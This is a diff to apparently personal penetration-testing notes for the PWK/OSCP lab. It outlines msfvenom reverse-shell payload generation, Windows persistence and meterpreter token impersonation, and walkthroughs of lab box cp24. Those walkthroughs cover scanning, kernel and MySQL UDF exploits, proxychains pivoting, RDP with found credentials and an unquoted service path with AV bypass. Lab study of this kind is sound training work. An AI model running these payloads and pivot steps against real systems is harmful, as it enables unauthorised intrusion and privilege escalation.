@@ -3659,7 +3659,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=80 -x /usr/share/
   ## -i iteration
   ## -f raw, output raw payload only
     #+end_src
-    + src (shellter):
+    + src (shellter, broken):
     #+begin_src sh
 shellter
   ## Operation Mode: Auto
@@ -3673,6 +3673,13 @@ shellter
      + info:
        - [[https://en.wikipedia.org/wiki/Ephemeral_port][wiki: Ephemeral port]]
        - IANA suggests 49152-65535 (2^15 + 2^14 to 2^16 -1)(windows) for dynamic or private ports
+         
+*** persistence (Windows)
+    + info:
+      - assume SYSTEM
+      - enum existing account (incognito `list_tokens`, net /domain)
+    + src:
+    
          
          
 * msf payload internal
@@ -3707,6 +3714,15 @@ shellter
   + bad chars (how to infer)
   + msfvenom, windows, linux payload execute methods summary.
   + (msfvenom hex payload reverse), nasm binary format?
+  + (migrate, why, how and without meterpreter)
+  + *Windows, admin -> SYSTEM*
+    
+  + the meterpreter workflow (use on Kerberos? time consideration? merit?) 
+    - ref:
+      + cheetsheet: [[https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf][an old meterpreter cheetsheet]], [[https://www.offensive-security.com/metasploit-unleashed/msfcli/][msfconsole -x]]
+      + the incognito module, the example workflow [[https://www.offensive-security.com/metasploit-unleashed/fun-incognito/][meterpreter incognito]] (need SYSTEM)
+  + kerberos (from local admin)
+  + post-enum scripts
      
 ** boxes
    1. ensure 100% with msf.
@@ -3719,7 +3735,7 @@ shellter
       
 
 ** flows:
-*** PWK cp24
+*** PWK cp24, wordpress webserver (linux) -> sql server (linux)
     - `sudo bash -c "echo '10.11.1.250 sandbox.local' >> /etc/hosts"`
     - nmap `sudo nmap -sC -sS -p0-65535 sandbox.local` -> web application
     - `dirb http://sandbox.local`
@@ -3737,6 +3753,16 @@ shellter
     - ssh Remote port forward the DB port.
     - find mysql exploits -> udf -> need write permission
     - kernel exploit on the wp server -> root -> sql root pw from the command history -> udf to get the shell from the sql server
+      
+*** PWK cp24, windows 
+    - prev on the sql server, /etc/fstab -> ip && content in mounted shared fs -> clear-text username && password
+    - ssh remote forward 1080 (socks4), config /etc/proxychains.conf (PWK p800), `socks4 127.0.0.1 1080`
+    - nmap with proxychains: `proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20` -> reveal opened 3389
+    - xfreedrp with proxychains: `proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard`
+    - [[Post-Exploitation Enumeration (Windows)]]: opened ports, account permission, wmic (auto start service)
+    - found Unquoted Search Path -> parse payload, bypass AV, download from browser -> root (poultry)
+    - 
+
       
 * AV bypass
 ** windows, powershell
